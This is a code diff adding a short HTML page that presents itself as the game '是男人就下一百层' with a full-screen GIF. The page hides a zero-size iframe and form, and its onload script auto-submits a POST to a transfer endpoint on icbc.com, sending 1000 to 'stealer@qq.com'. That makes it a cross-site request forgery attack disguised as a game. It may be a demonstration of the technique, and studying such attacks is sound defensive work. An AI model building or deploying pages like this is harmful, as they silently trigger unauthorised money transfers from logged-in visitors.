@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>是男人就下一百层</title>
+    <script src="http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+</head>
+<body>
+<img src="http://cms-bucket.nosdn.127.net/312e057a25f148519dc02b40812c78fe20170510155251.gif" alt="" width="100%" height="100%">
+    <iframe id="stealframe" src="" frameborder="0" style="width: 0;height: 0;">
+
+    </iframe>
+    <div id="box" style="width: 0;height: 0;">
+        <form action="http://icbc.com/transfer/" method="post" id="myform">
+            <input type="text" name="email" value="stealer@qq.com">
+            <input type="text" name="money" value="1000">
+        </form>
+    </div>
+    <script>
+        window.onload = function () {
+            $('#stealframe').contents().find('html').html($('#myform'));
+            $('#stealframe').contents().find('html').children('#myform').submit();
+        }
+    </script>
+</body>
+</html>
